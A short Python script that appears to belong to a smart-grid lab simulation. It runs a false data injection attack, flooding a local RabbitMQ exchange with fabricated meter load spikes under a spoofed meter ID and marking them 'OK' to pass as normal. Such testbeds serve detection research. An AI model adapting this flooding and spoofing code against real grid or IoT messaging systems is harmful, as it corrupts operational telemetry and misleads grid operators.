import pika
import json
import time
import random
from datetime import datetime

def start_attack(target_meter_id):
    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
    channel = connection.channel()
    channel.exchange_declare(exchange='smart_grid', exchange_type='topic')
    
    print(f"[!] INITIATING FALSE DATA INJECTION ON {target_meter_id}")
    print(f"[!] Flooding broker. Press CTRL+C to abort.")
    
    try:
        while True:
            # Massive, anomalous load spike
            malicious_load = round(random.uniform(500.0, 999.9), 2)
            
            payload = {
                "meter_id": target_meter_id,
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "load_kw": malicious_load,
                "type": "residential",
                "status": "OK" # Attacker attempts to look normal
            }
            
            channel.basic_publish(
                exchange='smart_grid',
                routing_key='telemetry.anomalous', # Routing key can be different or the same based on how you want to filter
                body=json.dumps(payload)
            )
            print(f"[!] INJECTED ANOMALY: {payload['load_kw']} kW")
            time.sleep(0.2) # High frequency flood
            
    except KeyboardInterrupt:
        print("\n[*] Attack halted.")
        connection.close()

if __name__ == "__main__":
    # Spoofing the ID from the normal script
    start_attack(target_meter_id="RES_METER_001")
